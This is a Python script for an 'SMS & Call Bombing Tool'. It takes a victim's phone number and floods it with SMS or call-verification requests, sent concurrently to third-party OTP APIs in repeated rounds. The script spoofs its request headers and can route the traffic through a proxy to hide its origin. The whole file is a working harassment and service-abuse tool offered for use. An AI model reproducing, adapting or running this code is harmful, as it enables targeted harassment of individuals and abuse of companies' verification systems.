# Standard Libraries
import argparse
import concurrent.futures
import signal
from datetime import datetime
from os import _exit

# Third-Party Libraries
import requests
from alive_progress import alive_bar
from colorama import init, Fore, Style
from fake_headers import Headers

# Custom Module
from api import send_otp_requests


def parse_arguments():
    """
    Parse command-line arguments.
    """
    parser = argparse.ArgumentParser(description="SMS & Call Bombing Tool")
    parser.add_argument("target", help="Target phone number (e.g. 09123456789)")
    parser.add_argument(
        "-c", "--count",
        help="Number of bombing rounds (default: 1)",
        type=int,
        default=1,
    )
    parser.add_argument(
        "-t", "--threads",
        help="Number of concurrent threads (default: 5)",
        type=int,
        default=5,
    )
    parser.add_argument(
        "-m", "--mode",
        help="Bombing mode: sms (default) or call",
        choices=["sms", "call"],
        default="sms",
    )
    parser.add_argument(
        "-v", "--verbose",
        help="Show detailed output",
        action="store_true",
    )
    parser.add_argument(
        "-x", "--proxy",
        help="Proxy server (e.g. http://ip:port)",
    )
    args = parser.parse_args()
    return args.target, args.count, args.threads, args.mode, args.verbose, args.proxy


def send_request(api_name, api_url, data, timeout, headers=None, proxy=None):
    """
    Send HTTP request to the specified API.
    """
    current_time = datetime.now().strftime(f"{Style.BRIGHT}%H:%M:%S{Style.NORMAL}")

    if headers is None:
        fake_headers = Headers()
        used_headers = fake_headers.generate()
    else:
        used_headers = headers

    try:
        if isinstance(data, dict):
            response = requests.post(
                api_url,
                headers=used_headers,
                json=data,
                timeout=timeout,
                proxies=proxy,
            )
        else:
            response = requests.post(
                api_url,
                headers=used_headers,
                data=data,
                timeout=timeout,
                proxies=proxy,
            )

        response.raise_for_status()
        return f"{Fore.YELLOW}[{current_time}] {Fore.GREEN}{Style.BRIGHT}[+] {api_name}{Style.NORMAL} => {Style.BRIGHT}OK"
    except requests.exceptions.RequestException as e:
        error_code = e.response.status_code if hasattr(e, "response") and e.response else "Unknown"
        return f"{Fore.YELLOW}[{current_time}] {Fore.RED}{Style.BRIGHT}[-] {api_name}{Style.NORMAL} => Error {error_code}"


def process_target(api, proxy):
    """
    Process a single API target.
    """
    headers = api.get("headers")
    return send_request(api["name"], api["url"], api["data"], timeout=3.0, headers=headers, proxy=proxy)


def handle_sigint(signal, frame):
    """
    Handle SIGINT (Ctrl+C) signal.
    """
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}[!] Process interrupted by user.")
    _exit(1)


def display_results(futures, mode):
    """
    Display bombing results summary.
    """
    results = [future.result() for future in futures]
    succeeded = [r for r in results if "OK" in r]
    failed = [r for r in results if "Error" in r]
    print(
        f"\n{Style.BRIGHT}{Fore.YELLOW}[?]{Fore.RESET} {mode.upper()} Successful: {Fore.GREEN}{len(succeeded)}, "
        f"Failed: {Fore.RED}{len(failed)}"
    )


def main():
    """
    Main function to run the bombing tool.
    """
    init(autoreset=True)
    signal.signal(signal.SIGINT, handle_sigint)

    target, count, threads, mode, verbose, proxy = parse_arguments()
    proxy_dict = {"http": proxy, "https": proxy} if proxy else None

    if proxy:
        print(f"{Fore.MAGENTA}{Style.BRIGHT}[?] Using proxy: {proxy}")

    print(f"{Fore.CYAN}{Style.BRIGHT}[i] Mode: {mode.upper()} | Target: {target} | Rounds: {count} | Threads: {threads}")

    apis = send_otp_requests(target, mode=mode)

    if not apis:
        print(f"{Fore.RED}No APIs found for mode '{mode}'!")
        return

    total_requests = count * len(apis)
    print(f"{Fore.CYAN}Total requests: {total_requests} (APIs: {len(apis)})")

    with alive_bar(total_requests, theme="smooth") as progress_bar:
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [
                executor.submit(process_target, api, proxy_dict)
                for api in apis * count
            ]

            for future in concurrent.futures.as_completed(futures):
                progress_bar()
                result = future.result()
                if verbose:
                    if "OK" in result:
                        print(f"{Fore.GREEN}{result}")
                    else:
                        print(f"{Fore.RED}{result}")

    display_results(futures, mode)
    print(f"{Fore.GREEN}{mode.upper()} bombing completed successfully.")


if __name__ == "__main__":
    main()